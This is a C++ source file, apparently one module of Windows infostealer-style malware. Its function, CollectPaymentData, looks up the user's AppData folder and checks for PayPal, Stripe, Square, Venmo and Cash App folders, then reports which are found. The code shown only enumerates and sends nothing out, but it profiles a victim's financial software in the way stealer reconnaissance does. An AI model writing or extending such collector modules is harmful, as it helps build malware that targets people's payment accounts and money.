#include "payment_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string PaymentCollector::CollectPaymentData() {
    std::ostringstream result;
    result << "\n=== PAYMENT DATA ===\n";
    
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::vector<std::pair<std::string, std::string>> paymentApps = {
        {"PayPal", std::string(appdata) + "\\PayPal"},
        {"Stripe", std::string(appdata) + "\\Stripe"},
        {"Square", std::string(appdata) + "\\Square"},
        {"Venmo", std::string(appdata) + "\\Venmo"},
        {"Cash App", std::string(appdata) + "\\CashApp"}
    };
    
    int found = 0;
    for (const auto& [name, path] : paymentApps) {
        if (std::filesystem::exists(path)) {
            result << name << ": FOUND\n";
            found++;
        }
    }
    
    result << "Total payment apps found: " << found << "\n";
    
    return result.str();
}
